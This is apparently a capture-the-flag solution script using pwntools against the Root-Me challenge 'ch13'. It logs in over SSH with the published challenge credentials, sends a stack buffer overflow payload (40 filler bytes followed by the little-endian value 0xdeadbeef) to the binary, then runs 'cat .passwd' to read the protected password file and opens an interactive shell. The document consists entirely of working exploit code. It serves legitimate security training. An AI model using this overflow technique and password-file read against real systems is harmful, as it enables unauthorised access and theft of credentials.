from pwn import *


socket = ssh(host='challenge02.root-me.org', user='app-systeme-ch13', password='app-systeme-ch13', port=2222)
p = socket.process('./ch13')

address = 0xdeadbeef
print(f"LE adress : {address.to_bytes(4, 'little')}")
payload = b'A' * 40 + address.to_bytes(4, 'little')

p.sendline(payload)
p.sendline('cat .passwd')
p.interactive()